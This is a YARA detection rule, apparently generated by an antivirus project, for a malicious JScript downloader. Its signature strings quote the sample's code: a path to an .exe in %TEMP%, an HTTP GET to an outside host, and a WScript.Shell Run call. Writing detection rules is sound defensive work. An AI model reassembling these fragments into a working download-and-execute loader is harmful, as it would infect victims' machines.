rule sig_20160328_cf1813af9ff264cb52ce1466b595d440 {
  meta:
    description = "datamaliciousorder - file 20160328_cf1813af9ff264cb52ce1466b595d440.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d515c6f54ea42d1be3d3bcd7b1bf421be330808d8f4addbcbf2eb0772aa2d794"

  strings:
    $s1  = "function Yzrztrr() {return Lyqdxzzae[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"edsEGpl1Hx.exe\";};" fullword ascii
    $s2  = "Swylx[Sbsdmpgi](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Fnszjm](Yrcxiyem() * 11)} while (Swylx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Stvxpg(Oxuqtk, Zoniomrn){return Oxuqtk - Zoniomrn;};" fullword ascii
    $s5  = "var Lyqdxzzae = function Evbxjdc() {return WScript[Qlyyrhqzq](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Cejwzzv(Yuqqcmd) {var Sqmuk = (1, 2, 3, 4, 5, Yuqqcmd); return Sqmuk;};" fullword ascii
    $s7  = "function Tvmqfhlxmh() {return ((Odrvncc == true) && (Odrvncc == Hkrulbt)) ? 1 : Ljvhxx;};" fullword ascii
    $s8  = "function Pvxuetkcui(Rwmxmvi){Lyqdxzzae[\"Run\"](Rwmxmvi, Ljvhxx, Ljvhxx);};" fullword ascii
    $s9  = "Hkrulbt = true; " fullword ascii
    $s10 = " while (Twwypfdnd){" fullword ascii
    $s11 = "Odrvncc = true; " fullword ascii
    $s12 = "function Yrcxiyem(){return 22;};" fullword ascii
    $s13 = "function Nhodqmve(){return Dlyvbbls;};" fullword ascii
    $s14 = "function Vehhiuhod(){return Qlyyrhqzq;};" fullword ascii
    $s15 = "var Hkrulbt = false;" fullword ascii
    $s16 = "var Odrvncc = false;" fullword ascii
    $s17 = "function Veemoudf()" fullword ascii
    $s18 = "return Stvxpg(Hiwzc, Whntfuqd);" fullword ascii
    $s19 = "var Yvmsix = false;" fullword ascii
    $s20 = "var Vinjlzbhik = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}